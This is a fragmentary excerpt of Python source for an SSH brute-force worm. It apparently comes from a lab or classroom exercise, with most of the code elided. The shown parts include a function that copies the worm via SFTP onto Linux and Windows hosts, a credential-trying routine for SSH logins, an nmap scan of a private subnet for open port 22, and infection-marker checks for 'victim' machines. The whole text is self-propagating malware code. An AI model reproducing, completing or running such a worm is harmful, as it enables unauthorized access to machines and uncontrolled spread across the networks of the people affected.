...
WORM_FILE = "/Desktop/Malware/sshbf_worm.py"
...
def spreadAndExecute( sshClient, sftpClient ):
	...
	try:
		print("[TRYING LINUX]")
		sftpClient.put( find_file( "sshbf_worm.py" ), "/tmp/" + "worm.py" )
	...
	try: 	
		...
		sftpClient.put( find_file( "sshbf_worm.py" ), "C:/" + "sshbf_worm.py" )
...
def tryCredentials( host, userName, password, sshClient ):
	...
	# Otherwise.
		...
		print ("Socket Error - " + str(sock_err))
		return 3
...
def getHostsOnTheSameNetwork( ):
	...
	portScanner.scan( '10.0.3.0/24', arguments= '-p 22 --open -Pn')
	#arguments = '-p 22 --open' 
...
if len( sys.argv ) < 2 and not os.path.exists( HOST_MARKER_FILE ):
	...
	print("Victim: < 2 arguments")
	if os.path.exists( INFECTED_MARKER_FILE ):
		print("Infected marker exists")
		sys.exit()
